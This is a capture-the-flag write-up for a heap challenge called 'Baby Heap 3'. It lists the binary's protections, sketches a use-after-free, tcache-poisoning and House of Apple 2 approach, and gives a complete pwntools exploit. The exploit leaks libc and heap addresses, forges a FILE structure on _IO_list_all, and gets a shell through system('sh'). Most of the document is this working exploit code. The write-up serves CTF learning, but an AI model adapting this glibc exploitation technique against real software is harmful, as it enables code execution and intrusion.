# Baby Heap 3

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |no    |
|libc  |2.35-0ubuntu3.15|

## 解题思路

随意 UAF，可以释放后再释放或读写。常规手法泄露信息后打 tcache poisoning
走 House of Apple 2 即可。

## EXPLOIT

```python
from pwn import *
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
EXE = './babyheap3'
context.arch = 'amd64'
ARGS = { 'gdb_args': [
    '-iex', 'set debug-file-directory /libraries/2.35-0ubuntu3.15/.debug',
    '-iex', 'set directories /usr/src/debug/glibc-2.35'],
}

def payload(lo: int):
    global t
    if lo:
        t = process(EXE)
        if lo & 2:
            gdb.attach(t, **ARGS)
    else:
        t = remote('', 9999)
    elf = ELF(EXE)
    libc = elf.libc

    def create(idx: int, size: int):
        t.sendlineafter(b'choice', b'1')
        t.sendlineafter(b'index', str(idx).encode())
        t.sendlineafter(b'size', str(size).encode())

    def revise(idx: int, buf: bytes):
        t.sendlineafter(b'choice', b'2')
        t.sendlineafter(b'index', str(idx).encode())
        t.sendlineafter(b'length', str(len(buf)).encode())
        t.sendafter(b'data', buf)

    def inspect(idx: int) -> bytes:
        t.sendlineafter(b'choice', b'3')
        t.sendlineafter(b'index', str(idx).encode())
        t.recvuntil(b'data: ')
        return t.recvuntil(b'\n1. create', drop=True)

    def discard(idx: int):
        t.sendlineafter(b'choice', b'4')
        t.sendlineafter(b'index', str(idx).encode())

    def leave():
        t.sendlineafter(b'choice', b'5')

    create(0, 0xf8)
    create(1, 0xf8)
    create(2, 0xf8)
    create(15, 0x420)
    create(3, 0xf8)
    discard(15)
    discard(0)

    libc_base = u64(inspect(15)[:8]) - 0x21ace0
    success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))
    libc.address = libc_base

    heap_base = u64(inspect(0)[:8]) << 12
    success(GOLD_TEXT(f'Leak heap_base: {heap_base:#x}'))

    def PROTECT_PTR(val: int, pos: int) -> int:
        return (pos >> 12) ^ val

    discard(1)
    discard(2)
    revise(1, p64(PROTECT_PTR(libc.symbols['_IO_list_all'], heap_base)))
    heap = heap_base + 0x9d0
    revise(3, flat({
        0:      b'  sh;\0',
        0x28:   1,
        0x68:   libc.symbols['system'],
        0x88:   heap - 0x10, # lock
        0xa0:   heap,
        0xd8:   libc.symbols['_IO_wfile_jumps'],
        0xe0:   heap,
        0xe8:   0, # align up 16
    }, filler=b'\0'))

    create(4, 0xf8) # take back chunk 2
    create(5, 0xf8) # take back chunk 1
    create(6, 0xf8) # take back chunk 0 <- _IO_list_all
    revise(6, p64(heap))

    leave()
    t.clean()
    t.interactive()
    t.close()
```
